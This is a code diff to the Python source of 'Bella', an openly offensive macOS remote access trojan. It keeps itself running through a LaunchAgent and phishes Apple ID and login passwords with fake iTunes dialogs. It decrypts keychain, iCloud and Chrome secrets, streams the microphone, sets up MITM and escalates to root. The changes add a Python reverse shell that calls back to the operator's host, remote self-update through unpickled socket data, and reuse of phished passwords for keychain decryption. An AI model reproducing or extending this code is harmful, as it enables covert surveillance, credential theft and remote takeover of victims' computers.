@@ -2,26 +2,47 @@
 # -*- coding: utf-8 -*-
 import sys, socket, subprocess, time, os, platform, struct, getpass, datetime, plistlib, re, stat, grp, shutil
 import string, json, traceback, pwd, urllib, urllib2, base64, binascii, hashlib, sqlite3, bz2, pickle, ast
-import StringIO, zipfile, hmac, tempfile, ssl
+import StringIO, zipfile, hmac, tempfile, ssl, select
 from xml.etree import ElementTree as ET
 from subprocess import Popen, PIPE
 from glob import glob
 development = True
 def create_bella_helpers(launch_agent_name, bella_folder, home_path):
-	launch_agent_create = """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
-	<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
-	<plist version=\"1.0\">
-	<dict>
-		<key>Label</key>
-		<string>%s</string>
-		<key>ProgramArguments</key>
-		<array>
-			<string>%s/Library/%s/Bella</string>
-		</array>
-		<key>StartInterval</key>
-		<integer>5</integer>
-	</dict>
-	</plist>\n""" % (launch_agent_name, home_path, bella_folder)
+	if development:
+		launch_agent_create = """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+		<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
+		<plist version=\"1.0\">
+		<dict>
+			<key>Label</key>
+			<string>%s</string>
+			<key>ProgramArguments</key>
+			<array>
+				<string>%s/Library/%s/Bella</string>
+			</array>
+			<key>StandardErrorPath</key>
+			<string>%s/Library/%s/Bella.stderr.log</string>
+			<key>StandardOutPath</key>
+			<string>%s/Library/%s/Bella.stdout.log</string>
+			<key>StartInterval</key>
+			<integer>5</integer>
+		</dict>
+		</plist>\n""" % (launch_agent_name, home_path, bella_folder, home_path, bella_folder, home_path, bella_folder)
+	else:
+		launch_agent_create = """<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+		<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
+		<plist version=\"1.0\">
+		<dict>
+			<key>Label</key>
+			<string>%s</string>
+			<key>ProgramArguments</key>
+			<array>
+				<string>%s/Library/%s/Bella</string>
+			</array>
+			<key>StartInterval</key>
+			<integer>5</integer>
+		</dict>
+		</plist>\n""" % (launch_agent_name, home_path, bella_folder)
+
 	if not os.path.isdir('%s/Library/LaunchAgents/' % home_path):
 		os.makedirs('%s/Library/LaunchAgents/' % home_path)
 	with open('%s/Library/LaunchAgents/%s.plist' % (home_path, launch_agent_name), 'wb') as content:
@@ -105,6 +126,14 @@ def subprocess_cleanup(): #will clean up all of those in the global payload_list
 			print 'Killed and cleaned [%s]' % x[2]
 			payload_list.remove(x)
 
+def update_server(updated_server):
+	with open(__file__, 'wb') as content:
+		content.write(updated_server)
+	send_msg('%sUpdated [%s] with new server code.\n' % (blue_star, __file__), False)
+	send_msg('%sRestarting server!\n' % (yellow_star), False)
+	send_msg(os.kill(bellaPID, 9), False)
+	return
+
 def readDB(column, payload=False):
 	#we need the path specified below, because we cant read the helper location from DB without knowing what to read
 	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
@@ -163,7 +192,7 @@ def createDB():
 	try:
 		conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
 		c = conn.cursor()
-		c.execute("CREATE TABLE bella (id int, username text, lastLogin text, model text, mme_token text, applePass text, localPass text, chromeSS text, text)")
+		c.execute("CREATE TABLE bella (id int, username text, lastLogin text, model text, mme_token text, applePass text, localPass text, chromeSS text, client_name text)")
 		c.execute("CREATE TABLE payloads(id int, vnc text, keychaindump text, microphone text, root_shell text, insomnia text, lock_icon text, chainbreaker text, mach_race text)")
 		conn.commit()
 		conn.close()
@@ -264,7 +293,7 @@ def appleIDPhish(username, GUIUser):
 		if isinstance(check, str): #we have file...
 			send_msg("%sApple password already found [%s] %s\n" % (blue_star, check, blue_star), False)
 			break
-		osa = "launchctl asuser " + str(bella_UID) + " osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; osascript -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. Please verify your password for " + username + " \" default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"'"
+		osa = "launchctl asuser " + str(bella_UID) + " osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; osascript -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to activate' -e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. Please verify your password for " + username + " \" default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"' -e 'text returned of result'"
 		#pauses music, then prompts user
 		out = check_output(osa)
 		if not out[0]:
@@ -273,8 +302,7 @@ def appleIDPhish(username, GUIUser):
 			continue
 		else:
 			out = out[1]
-			passw = out.split()[3]
-			passw = passw.split(':')[1]
+			passw = out.replace('\n', '')
 			send_msg("%sUser has attempted to use password: %s\n" % (blue_star, passw), False)
 			try:
 				request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
@@ -884,7 +912,13 @@ def initialize_socket():
 	if os.getuid() == 0:
 		basicInfo = 'ROOTED\n'
 
-	output = check_output('scutil --get LocalHostName; echo %s; pwd; echo %s' % (get_bella_user(), readDB('lastLogin')))
+	client_name = readDB('client_name')
+
+	if client_name == False:
+		output = check_output('scutil --get LocalHostName; echo %s; pwd; echo %s' % (get_bella_user(), readDB('lastLogin')))
+	else:
+		output = check_output('echo "%s"; echo "%s"; pwd; echo "%s"' % (client_name, get_bella_user(), readDB('lastLogin')))
+
 	if output[0]:
 		basicInfo += output[1]
 	else:
@@ -960,16 +994,17 @@ def manual():
 	value += "\n%sCheck Backups%s\nEnumerate the user's local iOS backups.\nUsage: %scheck_backups%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sChrome Dump%s\nDecrypt user passwords stored in Google Chrome profiles.\nUsage: %schrome_dump%s\nRequirements: Chrome SS Key [see chrome_safe_storage]\n" % (underline + bold + green, endANSI, bold, endANSI)
 	value += "\n%sChrome Safe Storage%s\nPrompt the keychain to present the user's Chrome Safe Storage Key.\nUsage: %schrome_safe_storage%s\nRequirements: None\n" % (underline + bold + green, endANSI, bold, endANSI)
-	value += "\n%sCurrent Users%s\nFind all currently logged in users.\nUsage: %scurrentUsers%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sCurrent Users%s\nFind all currently logged in users.\nUsage: %scurrent_Users%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sGet Root%s\nAttempt to escalate Bella to root through a variety of attack vectors.\nUsage: %sget_root%s\nRequirements: None\n" % (underline + bold + red, endANSI, bold, endANSI)
 	value += "\n%sFind my iPhone%s\nLocate all devices on the user's iCloud account.\nUsage: %siCloud_FMIP%s\nRequirements: iCloud Password [see iCloud_phish]\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sFind my Friends%s\nLocate all shared devices on the user's iCloud account.\nUsage: %siCloud_FMF%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%siCloud Contacts%s\nGet contacts from the user's iCloud account.\nUsage: %siCloud_contacts%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
-	value += "\n%siCloud Password Phish%s\nTrick user into verifying their iCloud password through iTunes prompt.\nUsage: %siCloudPhish%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
+	value += "\n%siCloud Password Phish%s\nTrick user into verifying their iCloud password through iTunes prompt.\nUsage: %siCloud_phish%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%siCloud Query%s\nGet information about the user's iCloud account.\nUsage: %siCloud_query%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%siCloud Token%s\nPrompt the keychain to present the User's iCloud Authorization Token.\nUsage: %siCloud_token%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sInsomnia Load%s\nLoads an InsomniaX Kext to prevent laptop from sleeping, even when closed.\nUsage: %sinsomnia_load%s\nRequirements: root, laptops only\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sInsomnia Unload%s\nUnloads an InsomniaX Kext loaded through insomnia_load.\nUsage: %sinsomnia_unload%s\nRequirements: root, laptops only\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sInteractive Shell%s\nLoads an interactive reverse shell (bash) to the remote machine. This allows us to run commands such as telnet, nano, sudo, etc.\nUsage: %sinteractive_shell%s\n" % (underline + bold, endANSI, bold, endANSI)
 	value += "\n%sBella Info%s\nExtensively details information about the user and information from the Bella instance.\nUsage: %sbella_info%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sKeychain Download%s\nDownloads all available Keychains, including iCloud, for offline processing.\nUsage: %skeychain_download%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sMike Stream%s\nStreams the microphone input over a socket.\nUsage: %smike_stream%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
@@ -979,10 +1014,10 @@ def manual():
 	value += "\n%sRemove Server%s\nCompletely removes a Bella server remotely.\nUsage: %sremoveserver_yes%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSafari History%s\nDownloads user's Safari history in a nice format.\nUsage: %ssafari_history%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sScreenshot%s\nTake a screen shot of the current active desktop.\nUsage: %sscreen_shot%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sSet Client Name%s\nChange the computer name that is displayed in the Control Center.\nUsage: %sset_client_name%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sSystem Information%s\nReturns basic information about the system.\nUsage: %ssysinfo%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
-	#value += "\n%sInteractive Shell%s\nLoads an interactive reverse shell (bash) to the remote machine.\nUsage: %sinteractiveShell%s\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Start%s\nBegin keylogging in the background.\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Kill%s\nStop keylogging started through Key Start\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
 	#value += "\n%sKey Read%s\nReads the encrypted key log file from Key Start.\nUsage: %skeyRead%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
@@ -1010,7 +1045,7 @@ def mike_helper(payload_path):
 
 def mitm_kill(interface, certsha1):
 	if not is_there_SUID_shell():
-		return "%sYou must have a root shell to stop MITM. See rooter.\n" % red_minus
+		return "%sYou must have a root shell to stop MITM. See get_root.\n" % red_minus
 
 	x = check_output("networksetup -getsecurewebproxy %s" % interface)
 	if not x[0]:
@@ -1055,7 +1090,8 @@ def mitm_kill(interface, certsha1):
 
 def mitm_start(interface, cert):
 	if not is_there_SUID_shell():
-		return "%sYou must have a root shell to start MITM. See rooter.\n" % red_minus
+		send_msg("%sYou must have a root shell to start MITM. See get_root.\n" % red_minus, True)
+		return
 
 	x = check_output("networksetup -getsecurewebproxy %s" % interface)
 	if not x[0]:
@@ -1105,13 +1141,16 @@ def payload_cleaner():
 			print e
 	return
 
-def chainbreaker(kcpath, key, service):
+def chainbreaker(kcpath, key, service, password=None):
 	kcbreaker = readDB('chainbreaker', True)
 	if not kcbreaker:
 		return ("%sError reading chainbreaker from DB.\n" % red_minus, False)
 	path = payload_generator(kcbreaker)
 	try:
-		value = (subprocess.check_output("%s -f '%s' -k '%s' -s '%s'" % (path, kcpath, key, service), shell=True).replace('\n', ''), True)
+		if password:
+			value = (subprocess.check_output("%s -f '%s' -p '%s' -s '%s'" % (path, kcpath, password, service), shell=True).replace('\n', ''), True)
+		else:
+			value = (subprocess.check_output("%s -f '%s' -k '%s' -s '%s'" % (path, kcpath, key, service), shell=True).replace('\n', ''), True)
 		if '[!] ERROR: ' in value[0]:
 			return ("%sError decrypting %s with master key.\n\t%s" % (red_minus, service, value[0]), False)
 		print repr(value[0])
@@ -1146,6 +1185,7 @@ def kciCloudHelper(iCloudKey):
 	return tokz
 
 def getKeychains():
+	#will return the last modified keychain
 	send_msg("%sFound the following keychains for [%s]:\n" % (yellow_star, get_bella_user()), False)
 	kchains = glob("/Users/%s/Library/Keychains/login.keychain*" % get_bella_user())
 	for x in kchains:
@@ -1153,10 +1193,11 @@ def getKeychains():
 	if len(kchains) == 0:
 		send_msg("%sNo Keychains found for [%s].\n" % (yellow_star, get_bella_user()), True)
 		return
-	kchain = kchains[-1]
-	for x in kchains:
-		if x.endswith('-db'):
-			kchain = x
+	kchains.sort(key=os.path.getmtime)
+	kchain = kchains[-1] #get the last modified one
+	#for x in kchains:
+	#	if x.endswith('-db'):
+	#		kchain = x
 	return kchain
 
 def bella_info():
@@ -1217,13 +1258,14 @@ def bella_info():
 				send_msg("%sError reading KCDump payload from Bella Database.\n" % red_minus, False)
 			else:
 				kcpath = payload_generator(kcpayload)
-				kchain = getKeychains()
 				(success, msg) = do_root("%s '%s' | grep 'Found master key:'" % (kcpath, kchain)) # ??? Why doesnt this work for tim?
+
+				master_key = msg.replace("[+] Found master key: ", "").replace("\n", "")
 				if success:
 					send_msg("    Login keychain master key found for [%s]:\n\t[%s]\n" % (kchain.split("/")[-1], msg.replace("[+] Found master key: ", "").replace("\n", "")), False)
 					if not readDB('mme_token'):
 						send_msg("\t%sAttempting to generate iCloud Auth Keys.\n" % blue_star, False)
-						iCloud = chainbreaker(kchain, msg.replace("[+] Found master key: ", "").replace("\n", ""), 'iCloud')
+						iCloud = chainbreaker(kchain, master_key, 'iCloud')
 						send_msg("\t%siCloud:\n\t    [%s]\n" % (yellow_star, iCloud[0]), False)
 						if iCloud[1]:
 							send_msg("\t%sGot iCloud Key! Decrypting plist.\n" % yellow_star, False)
@@ -1236,7 +1278,7 @@ def bella_info():
 								send_msg("\t%sUpdated DB.\n\t    --------------\n" % greenPlus, False)
 					if not readDB('chromeSS'):
 						send_msg("\t%sAttempting to generate Chrome Safe Storage Keys.\n" % blue_star, False)
-						chrome = chainbreaker(kchain, msg.replace("[+] Found master key: ", "").replace("\n", ""), 'Chrome Safe Storage')
+						chrome = chainbreaker(kchain, master_key, 'Chrome Safe Storage')
 						send_msg("\t%sChrome:\n\t    [%s]\n" % (yellow_star, chrome[0]), False)
 						if chrome[1]:
 							send_msg("\t%sGot Chrome Key! Updating Bella DB.\n" % yellow_star, False)
@@ -1282,6 +1324,28 @@ def bella_info():
 	checkLP = local_pw_read()
 	if isinstance(checkLP, str):
 		send_msg("%s%s's local account password is available.\n" % (yellow_star, checkLP.split(':')[0]), False) #get username
+		if not readDB('mme_token'):
+			send_msg("\t%sAttempting to generate iCloud Auth Keys with local password.\n" % blue_star, False)
+			iCloud = chainbreaker(kchain, 0, 'iCloud', checkLP.split(':')[1])
+			send_msg("\t%siCloud:\n\t    [%s]\n" % (yellow_star, iCloud[0]), False)
+			if iCloud[1]:
+				send_msg("\t%sGot iCloud Key! Decrypting plist.\n" % yellow_star, False)
+				decrypted = kciCloudHelper(iCloud[0])
+				if not decrypted:
+					send_msg("\t%sError getting decrypted MMeAuthTokens with local password.\n" % red_minus, False)
+				else:
+					send_msg("\t%sDecrypted. Updating Bella database.\n" % blue_star, False)
+					updateDB(encrypt(decrypted), 'mme_token')
+					send_msg("\t%sUpdated DB.\n\t    --------------\n" % greenPlus, False)
+		if not readDB('chromeSS'):
+			send_msg("\t%sAttempting to generate Chrome Safe Storage Keys.\n" % blue_star, False)
+			chrome = chainbreaker(kchain, 0, 'Chrome Safe Storage', checkLP.split(':')[1])
+			send_msg("\t%sChrome:\n\t    [%s]\n" % (yellow_star, chrome[0]), False)
+			if chrome[1]:
+				send_msg("\t%sGot Chrome Key! Updating Bella DB.\n" % yellow_star, False)
+				updateDB(encrypt(chrome[0]), 'chromeSS')
+				send_msg("\t%sUpdated DB.\n" % greenPlus, False)
+
 
 	checkAP = applepwRead()
 	if isinstance(checkAP, str):
@@ -1455,7 +1519,7 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 			send_msg('', True)
 			return
 	else:
-		send_msg("%sNo local user password found. This will give us system and can be phished.\n" % red_minus, False)
+		send_msg("%sNo user password found. Run 'phish_user_pass' to phish this. It should give us root.\n" % red_minus, False)
 
 	if sys_vers.startswith("10.8") or sys_vers.startswith("10.9") or sys_vers.startswith("10.10") or sys_vers == ("10.11") or sys_vers == ("10.11.1") or sys_vers == ("10.11.2") or sys_vers == ("10.11.3"):
 		zipped = readDB('mach_race', True)
@@ -1477,6 +1541,15 @@ def rooter(): #ROOTER MUST BE CALLED INDEPENDENTLY -- Equivalent to getsystem
 			return
 	send_msg("%sLocal privilege escalation not implemented for OSX %s, you will need to phish the admin password instead.\n" % (red_minus, sys_vers), True)
 	return
+
+def start_interactive_shell(shell_port):
+		shelled = subprocess.Popen("python -c \"import sys,socket,os,pty; _,ip,port=('', '%s', '%s'); s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')\"" % (host, shell_port), shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE  )
+		time.sleep(1)
+		if shelled.poll():
+			send_msg("%sFailed to start interactive shell.\nError: [%s]\n" % (red_minus, shelled.stderr.read().replace('\n', '')), True)
+		else:
+			send_msg('interactive_shell_init', True)
+		return
 
 def tokenFactory(authCode):
 	#now that we have proper b64 encoded auth code, we will attempt to get all account tokens.
@@ -1600,6 +1673,10 @@ def applepwRead():
 	if not pw:
 		return pw
 	return decrypt(pw)
+
+def set_client_name(name):
+	updateDB(name, 'client_name')
+	return 'updated_client_name:::%s:::%sUpdated client name to [%s].\n' % (name, blue_star, name)
 
 def screenShot():
 	screen = os.system("screencapture -x /tmp/screen")
@@ -1732,7 +1809,7 @@ def bella(*Emma):
 	while True:
 		subprocess_cleanup()
 		print "Starting Bella"
-
+		#rooter(). try to get root automatically. uncomment this line, if you want to run bella on say, a Guest account, and have it automatically escalate to root (via LPE) without you having to do anything.
 		#create encrypted socket.
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -1843,6 +1920,9 @@ def bella(*Emma):
 					send_msg(manual(), True)
 				elif data == "screen_shot":
 					send_msg(screenShot(), True)
+				elif data.startswith("update_server"):
+					send_msg("%sAttempting to update server!\n" % yellow_star, False)
+					send_msg(update_server(pickle.loads(data[13:])), True)
 				elif data == "chrome_safe_storage":
 					chrome_safe_storage()
 				elif data == "check_backups":
@@ -1866,7 +1946,7 @@ def bella(*Emma):
 				elif data == "reboot_server":
 					send_msg(os.kill(bellaPID, 9), True)
 				elif data == "current_users":
-					send_msg('\001\033[4mCurrently logged in users:\033[0m\002\n%s' % check_current_users(), True)
+					send_msg('\033[4mCurrently logged in users:\033[0m\n%s' % check_current_users(), True)
 				elif data == "bella_info":
 					bella_info()
 				elif data == "get_root":
@@ -1926,6 +2006,10 @@ def bella(*Emma):
 					certsha1 = data.split(":::")[2]
 					mitm_kill(interface, certsha1)
 
+				elif data.startswith("set_client_name"):
+					name = data.split(":::")[1]
+					send_msg(set_client_name(name), True)
+
 				elif data == 'chat_history':
 					chatDb = globber("/Users/*/Library/Messages/chat.db") #just get first chat DB
 					serial = []
@@ -1957,6 +2041,10 @@ def bella(*Emma):
 						shutil.rmtree(copypath)
 					serialized = pickle.dumps(serial)
 					send_msg("6E87CF0B" + serialized, True)
+
+				elif data.startswith('interactive_shell'):
+					interactive_shell_port = data.split(':::')[1]
+					start_interactive_shell(interactive_shell_port)
 
 				elif data.startswith('download'):
 					fileName = data[8:]
@@ -2037,7 +2125,11 @@ def bella(*Emma):
 					#we shouldnt have to kill iTunes, but if there is a problem with launchctl ..
 
 				elif data == 'get_client_info':
-					output = check_output('scutil --get LocalHostName | tr -d "\n"; printf -- "->"; whoami | tr -d "\n"')
+					client_name = readDB('client_name')
+					if client_name == False:
+						output = check_output('scutil --get LocalHostName | tr -d "\n"; printf -- "->"; whoami | tr -d "\n"')
+					else:
+						output = check_output('echo "%s" | tr -d "\n"; printf -- "->"; whoami | tr -d "\n"' % client_name)
 					if not output[0]:
 						send_msg('Error-MB-Pro -> Error', True)
 						continue
@@ -2045,41 +2137,39 @@ def bella(*Emma):
 
 				else:
 					try:
-						blocking = False
-						blockers = ['sudo', 'nano', 'ftp', 'emacs', 'telnet', 'caffeinate', 'ssh'] #the best i can do for now ...
-						for x in blockers:
-							if x in data:
-								send_msg('%s[%s] is a blocking command. It will not run.\n' % (yellow_star, x), True)
-								blocking = True
-								break
-						if not blocking:
-							proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-							####### MAKE THIS A GLOBAL RUNNER FUNCTION THAT WILL BE USED IN LIEU OF ALL CHECK_OUTPUTS #######
-							done = False
-							while proc.poll() == None:
-								bellaConnection.settimeout(0.0) #set socket to non-blocking (dont wait for data)
-								try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
-									if recv_msg(bellaConnection) == 'sigint9kill':
-										sys.stdout.flush()
-										proc.terminate()
-										send_msg('terminated', True) #send back confirmation along with STDERR
-										done = True
-										bellaConnection.settimeout(None)
-										break
-								except socket.error as e: #no message, business as usual
-									pass
-								bellaConnection.settimeout(None)
-
+						proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+						done = False
+						while proc.poll() == None:
+							bellaConnection.settimeout(0.0) #set socket to non-blocking (dont wait for data)
+							try: #SEE IF WE HAVE INCOMING MESSAGE MID LOOP
+								if recv_msg(bellaConnection) == 'sigint9kill':
+									sys.stdout.flush()
+									proc.terminate()
+									send_msg('terminated', True) #send back confirmation along with STDERR
+									done = True
+									bellaConnection.settimeout(None)
+									break
+							except socket.error as e: #no message, business as usual
+								pass
+							bellaConnection.settimeout(None)
+							out = select.select([proc.stdout.fileno()], [], [], 5)[0]
+							if out:
 								line = proc.stdout.readline()
 								if line != "":
 									send_msg(line, False)
 								else:
 									#at this point we are done with the loop, can get / send stderr
-									send_msg(line + proc.communicate()[1], True)
+									send_msg(line + proc.stderr.read(), True)
 									done = True
 									break
-							if not done:
-								send_msg(proc.stdout.read() + proc.stderr.read(), True)
+							else:
+								send_msg("%s[%s] is an interactive command.\n%sBella does not support interactive commands.\n%sUse 'interactive_shell' to perform this task.\n" % (blue_star, data, yellow_star, blue_star), True)
+								sys.stdout.flush()
+								#proc.terminate()
+								done = True
+								break
+						if not done:
+							send_msg(proc.stdout.read() + proc.stderr.read(), True)
 
 					except socket.error, e:
 						if e[0] == 32:
@@ -2110,20 +2200,20 @@ def bella(*Emma):
 			pass
 
 ##### Below variables are global scopes that are accessed by most of the methods in Bella. Should make a class structure #####
-endANSI = '\001\033[0m\002'
-bold = '\001\033[1m\002'
-underline = '\001\033[4m\022'
-red_minus = '\001\033[31m\002[-] %s' % endANSI
-greenPlus = '\001\033[92m\002[+] %s' % endANSI
-blue_star = '\001\033[94m\002[*] %s' % endANSI
-yellow_star = '\001\033[93m\002[*] %s' % endANSI
-violet = '\001\033[95m\002'
-blue = '\001\033[94m\002'
-light_blue = '\001\033[34m\002'
-green = '\001\033[92m\002'
-dark_green = '\001\033[32m\002'
-yellow = '\001\033[93m\002'
-red = '\001\033[31m\002'
+endANSI = '\033[0m'
+bold = '\033[1m'
+underline = '\033[4m'
+red_minus = '\033[31m[-] %s' % endANSI
+greenPlus = '\033[92m[+] %s' % endANSI
+blue_star = '\033[94m[*] %s' % endANSI
+yellow_star = '\033[93m[*] %s' % endANSI
+violet = '\033[95m'
+blue = '\033[94m'
+light_blue = '\033[34m'
+green = '\033[92m'
+dark_green = '\033[32m'
+yellow = '\033[93m'
+red = '\033[31m'
 bella_error = ''
 cryptKey = 'edb0d31838fd883d3f5939d2ecb7e28c'
 try:
